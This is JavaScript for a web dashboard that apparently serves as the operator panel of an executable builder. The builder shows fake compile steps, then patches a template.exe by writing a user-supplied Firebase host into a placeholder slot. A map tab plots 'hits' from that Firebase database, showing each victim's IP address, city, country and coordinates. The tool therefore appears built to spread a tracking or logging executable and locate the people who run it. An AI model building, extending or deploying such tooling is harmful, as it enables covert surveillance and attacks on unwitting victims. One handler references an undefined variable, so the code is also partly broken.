const ICONS = {
  overview: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="3" y="3" width="7" height="9" rx="1.5"/><rect x="14" y="3" width="7" height="5" rx="1.5"/><rect x="14" y="12" width="7" height="9" rx="1.5"/><rect x="3" y="16" width="7" height="5" rx="1.5"/></svg>`,
  profile: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><circle cx="12" cy="8" r="3.5"/><path d="M4.5 20c1.6-3.6 4.5-5.5 7.5-5.5s5.9 1.9 7.5 5.5"/></svg>`,
  automation: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M13 2 4 14h6l-1 8 9-12h-6l1-8Z" stroke-linejoin="round"/></svg>`,
  builder: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M14.7 6.3a4 4 0 0 1-5.34 5.34L4 17l3 3 5.36-5.36a4 4 0 0 1 5.34-5.34L21 6l-3-3-3.3 3.3Z" stroke-linejoin="round" stroke-linecap="round"/></svg>`,
  logs: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M6 3h9l4 4v14H6z"/><path d="M15 3v4h4M9 12h7M9 16h7M9 8h3"/></svg>`,
  settings: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><circle cx="12" cy="12" r="3"/><path d="M19.4 13a7.97 7.97 0 0 0 0-2l2-1.5-2-3.4-2.4.7a8.06 8.06 0 0 0-1.7-1L15 3h-4l-.3 2.4a8.06 8.06 0 0 0-1.7 1l-2.4-.7-2 3.4L6.6 11a7.97 7.97 0 0 0 0 2l-2 1.5 2 3.4 2.4-.7a8.06 8.06 0 0 0 1.7 1L11 21h4l.3-2.4a8.06 8.06 0 0 0 1.7-1l2.4.7 2-3.4-2-1.6Z"/></svg>`,
  logout: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><path d="M16 17l5-5-5-5M21 12H9"/></svg>`,
  "discord-mark": `<svg viewBox="0 0 24 24" fill="currentColor"><path d="M20.317 4.492c-1.53-.69-3.17-1.2-4.885-1.49a.075.075 0 0 0-.079.036c-.21.369-.444.85-.608 1.23a18.566 18.566 0 0 0-5.487 0 12.36 12.36 0 0 0-.617-1.23A.077.077 0 0 0 8.562 3c-1.714.29-3.354.8-4.885 1.491a.07.07 0 0 0-.032.027C.533 9.093-.32 13.555.099 17.961a.08.08 0 0 0 .031.055 20.03 20.03 0 0 0 5.993 2.98.078.078 0 0 0 .084-.026 13.83 13.83 0 0 0 1.226-1.963.074.074 0 0 0-.041-.104 13.201 13.201 0 0 1-1.872-.878.075.075 0 0 1-.008-.125c.126-.093.252-.19.372-.287a.075.075 0 0 1 .078-.01c3.927 1.764 8.18 1.764 12.061 0a.075.075 0 0 1 .079.009c.12.098.246.195.373.288a.075.075 0 0 1-.006.125c-.598.344-1.22.635-1.873.877a.075.075 0 0 0-.04.105c.36.687.772 1.341 1.225 1.962a.077.077 0 0 0 .084.028 19.963 19.963 0 0 0 6.002-2.981.076.076 0 0 0 .032-.054c.5-5.094-.838-9.52-3.549-13.442a.06.06 0 0 0-.031-.028Z"/></svg>`,
};

let profile = { username: "", handle: "", avatar: "", id: "" };

function $(id) {
  return document.getElementById(id);
}

function setText(id, value) {
  const el = $(id);
  if (el) el.textContent = value;
}

function setSrc(id, value) {
  const el = $(id);
  if (el) el.src = value;
}

function applyIcons() {
  document.querySelectorAll("[data-icon]").forEach((el) => {
    el.innerHTML = ICONS[el.dataset.icon] || "";
  });
}

function showToast(message) {
  const toast = $("toast");
  if (!toast) return;
  toast.textContent = message;
  toast.classList.add("show");
  clearTimeout(showToast._t);
  showToast._t = setTimeout(() => toast.classList.remove("show"), 1800);
}

function loadProfile() {
  const params = new URLSearchParams(window.location.search);
  const username = params.get("username");

  if (!username) {
    window.location.href = "index.html";
    return;
  }

  profile = {
    username,
    handle: params.get("handle") || username,
    avatar: params.get("avatar") || "https://cdn.discordapp.com/embed/avatars/0.png",
    id: params.get("id") || "—",
  };

  renderProfile();
}

function renderProfile() {
  setSrc("chip-avatar", profile.avatar);
  setText("chip-name", profile.username);
  setText("chip-tag", "@" + profile.handle);
  setText("hello-name", "Welcome back, " + profile.username);

  setSrc("account-avatar", profile.avatar);
  setText("account-name", profile.username);
  setText("account-handle", "@" + profile.handle);
  setText("account-id", profile.id);
}

function wireNav() {
  const items = document.querySelectorAll(".nav-item[data-target]");
  items.forEach((item) => {
    item.addEventListener("click", () => {
      items.forEach((i) => i.classList.remove("active"));
      item.classList.add("active");

      document.querySelectorAll(".tab-panel").forEach((p) => p.classList.remove("active"));
      const target = $("panel-" + item.dataset.target);
      if (target) target.classList.add("active");

      const labelSpan = item.querySelector("span:last-child");
      if (labelSpan) setText("panel-title", labelSpan.textContent);

      if (item.dataset.target === "dashboard") {
        requestAnimationFrame(() => window.__mapWidget && window.__mapWidget.resize());
      }
    });
  });
}

function wireButtons() {
  document.querySelectorAll(".btn[data-inert]").forEach((btn) => {
    btn.addEventListener("click", () => showToast("This button doesn't do anything yet"));
  });

  const logoutItem = $("logout-item");
  if (logoutItem) logoutItem.addEventListener("click", () => (window.location.href = "index.html"));

  const accountLogout = $("account-logout-btn");
  if (accountLogout) accountLogout.addEventListener("click", () => (window.location.href = "index.html"));

  const copyBtn = $("copy-id-btn");
  if (copyBtn) {
    copyBtn.addEventListener("click", async () => {
      try {
        await navigator.clipboard.writeText(profile.id);
        showToast("Copied ID to clipboard");
      } catch {
        showToast("Couldn't copy — copy it manually");
      }
    });
  }

  const firebaseSaveBtn = $("firebase-save-btn");
  const firebaseInput = $("firebase-url");
  if (firebaseSaveBtn && firebaseInput) {
    const saved = localStorage.getItem("zx_firebase_host");
    if (saved) firebaseInput.value = saved;
    firebaseSaveBtn.addEventListener("click", () => {
      const val = firebaseInput.value.trim().replace(/^https?:\/\//,"").replace(/\/$/,"");
      if (!val) { showToast("Paste a Firebase URL first"); return; }
      localStorage.setItem("zx_firebase_host", val);
      showToast("Firebase URL saved");
      if (window.__reloadMapHits) window.__reloadMapHits(val);
    });
  }
  if (applyBtn) {
    applyBtn.addEventListener("click", () => {
      const input = $("nickname-input");
      const val = input ? input.value.trim() : "";
      if (!val) {
        showToast("Type a name first");
        return;
      }
      profile.username = val;
      renderProfile();
      showToast("Display name updated for this session");
    });
  }
}

function wireSettings() {
  document.querySelectorAll(".swatch").forEach((sw) => {
    sw.addEventListener("click", () => {
      document.querySelectorAll(".swatch").forEach((s) => s.classList.remove("selected"));
      sw.classList.add("selected");
      const color = sw.dataset.color;
      document.documentElement.style.setProperty("--violet", color);
      document.documentElement.style.setProperty("--violet-soft", color + "24");
      showToast("Accent color updated");
    });
  });

  const compactToggle = $("toggle-compact");
  if (compactToggle) {
    compactToggle.addEventListener("click", () => {
      compactToggle.classList.toggle("on");
      const sidebar = $("sidebar");
      if (sidebar) sidebar.classList.toggle("compact");
    });
  }

  const motionToggle = $("toggle-motion");
  if (motionToggle) {
    motionToggle.addEventListener("click", () => {
      motionToggle.classList.toggle("on");
      document.body.classList.toggle("motion-off");
    });
  }
}

function wireBuilder() {
  const nameInput = $("builder-name");
  const buildBtn = $("builder-build-btn");
  const downloadBtn = $("builder-download-btn");
  const firebaseInput = $("firebase-url");
  const log = $("build-log");
  if (!nameInput || !buildBtn || !downloadBtn || !log) return;

  let building = false;
  let chosenName = "myapp.exe";

  function addLine(text, cls) {
    const line = document.createElement("div");
    line.className = "build-log-line" + (cls ? " " + cls : "");
    line.textContent = text;
    log.appendChild(line);
    log.scrollTop = log.scrollHeight;
  }

  function sanitizeName(raw) {
    let name = (raw || "myapp.exe").trim().replace(/[\\/:*?"<>|]/g, "_");
    if (!name) name = "myapp.exe";
    if (!/\.exe$/i.test(name)) name += ".exe";
    return name;
  }

  function encodeUtf16LE(str) {
    const bytes = new Uint8Array(str.length * 2);
    for (let i = 0; i < str.length; i++) {
      const code = str.charCodeAt(i);
      bytes[i * 2] = code & 0xff;
      bytes[i * 2 + 1] = (code >> 8) & 0xff;
    }
    return bytes;
  }

  function findBytes(haystack, needle) {
    outer: for (let i = 0; i <= haystack.length - needle.length; i++) {
      for (let j = 0; j < needle.length; j++) {
        if (haystack[i + j] !== needle[j]) continue outer;
      }
      return i;
    }
    return -1;
  }

  function patchExe(buffer, firebaseHost) {
    const bytes = new Uint8Array(buffer);
    const SLOT_CHARS = 64;
    const needle = encodeUtf16LE("X".repeat(SLOT_CHARS));
    const offset = findBytes(bytes, needle);
    if (offset !== -1 && firebaseHost) {
      const safe = firebaseHost.trim().replace(/^https?:\/\//,"").replace(/\/$/,"").slice(0, SLOT_CHARS - 1);
      const slot = new Uint8Array(SLOT_CHARS * 2);
      slot.set(encodeUtf16LE(safe), 0);
      bytes.set(slot, offset);
    }
    return bytes;
  }

  buildBtn.addEventListener("click", () => {
    if (building) return;
    chosenName = sanitizeName(nameInput.value);
    building = true;
    downloadBtn.disabled = true;
    buildBtn.disabled = true;
    log.innerHTML = "";

    const steps = [
      `Compiling sources for ${chosenName}...`,
      `Linking objects...`,
      `Injecting Firebase endpoint...`,
      `Packaging ${chosenName}...`,
      `Build complete: ${chosenName}`,
    ];

    steps.forEach((text, i) => {
      setTimeout(() => {
        const isLast = i === steps.length - 1;
        addLine(text, isLast ? "done" : "ok");
        if (isLast) {
          building = false;
          buildBtn.disabled = false;
          downloadBtn.disabled = false;
          showToast(`${chosenName} is ready to download`);
        }
      }, (i + 1) * 550);
    });
  });

  downloadBtn.addEventListener("click", async () => {
    const firebaseHost = firebaseInput ? firebaseInput.value.trim() : "";
    if (!firebaseHost) {
      showToast("Paste your Firebase URL first");
      return;
    }
    try {
      const res = await fetch("template.exe");
      if (!res.ok) throw new Error("template.exe not found");
      const buffer = await res.arrayBuffer();
      const patched = patchExe(buffer, firebaseHost);
      const blob = new Blob([patched], { type: "application/octet-stream" });
      const url = URL.createObjectURL(blob);
      const a = document.createElement("a");
      a.href = url;
      a.download = chosenName;
      document.body.appendChild(a);
      a.click();
      a.remove();
      URL.revokeObjectURL(url);
      showToast(`Downloading ${chosenName}`);
    } catch (err) {
      showToast("Download failed — is template.exe uploaded?");
    }
  });
}

function initMap() {
  const shell = $("map-shell");
  const mapEl = $("map-leaflet");
  if (!shell || !mapEl || typeof L === "undefined") return;

  const map = L.map(mapEl, {
    center: [20, 0],
    zoom: 2.4,
    zoomControl: false,
    attributionControl: true,
    worldCopyJump: true,
  });

  L.tileLayer("https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png", {
    attribution: '&copy; OpenStreetMap &copy; CARTO',
    subdomains: "abcd",
    maxZoom: 19,
  }).addTo(map);

  // Custom red teardrop pin SVG
  const redIcon = L.divIcon({
    className: "",
    html: `<svg xmlns="http://www.w3.org/2000/svg" width="28" height="38" viewBox="0 0 28 38">
      <path fill="#ff4d6d" stroke="#fff" stroke-width="1.5" d="M14 1C7.4 1 2 6.4 2 13c0 8 12 24 12 24s12-16 12-24C26 6.4 20.6 1 14 1z"/>
      <circle fill="#fff" cx="14" cy="13" r="5"/>
    </svg>`,
    iconSize: [28, 38],
    iconAnchor: [14, 38],
    popupAnchor: [0, -40],
  });

  function loadHits(firebaseHost) {
    if (!firebaseHost) return;
    const url = `https://${firebaseHost.replace(/^https?:\/\//,"").replace(/\/$/,"")}/hits.json`;
    fetch(url)
      .then(r => r.json())
      .then(data => {
        if (!data || typeof data !== "object") return;
        Object.values(data).forEach(hit => {
          if (!hit.lat || !hit.lon) return;
          const marker = L.marker([hit.lat, hit.lon], { icon: redIcon }).addTo(map);
          const popup = L.popup({
            closeButton: true,
            className: "zerox-popup",
            maxWidth: 240,
          }).setContent(`
            <div style="background:#0d1017;color:#e7e9f3;padding:12px 14px;border-radius:8px;font-family:'JetBrains Mono',monospace;font-size:12px;min-width:190px;">
              <div style="color:#ff4d6d;font-weight:700;font-size:13px;margin-bottom:6px;">${hit.ip || "Unknown IP"}</div>
              <div style="color:#4ce0d2;margin-bottom:4px;">${hit.city || "—"}, ${hit.country || "—"}</div>
              <div style="color:#7b8094;font-size:11px;">${hit.lat.toFixed(4)}, ${hit.lon.toFixed(4)}</div>
            </div>
          `);
          marker.bindPopup(popup);
        });
      })
      .catch(() => {});
  }

  // Try to load from saved Firebase URL
  const saved = localStorage.getItem("zx_firebase_host");
  if (saved) loadHits(saved);

  // Refresh hits when user saves Firebase URL in builder
  window.__reloadMapHits = loadHits;

  const zoomInBtn = $("map-zoom-in");
  if (zoomInBtn) zoomInBtn.addEventListener("click", () => map.zoomIn());

  const zoomOutBtn = $("map-zoom-out");
  if (zoomOutBtn) zoomOutBtn.addEventListener("click", () => map.zoomOut());

  const resetBtn = $("map-reset");
  if (resetBtn) resetBtn.addEventListener("click", () => map.setView([20, 0], 2.4));

  window.__mapWidget = { resize: () => map.invalidateSize(), draw: () => {} };
}

function safeRun(fn, label) {
  try {
    fn();
  } catch (err) {
    console.error(`[dashboard] ${label} failed:`, err);
  }
}

document.addEventListener("DOMContentLoaded", () => {
  safeRun(applyIcons, "applyIcons");
  safeRun(loadProfile, "loadProfile");
  safeRun(wireNav, "wireNav");
  safeRun(wireButtons, "wireButtons");
  safeRun(wireSettings, "wireSettings");
  safeRun(wireBuilder, "wireBuilder");
  safeRun(initMap, "initMap");
});
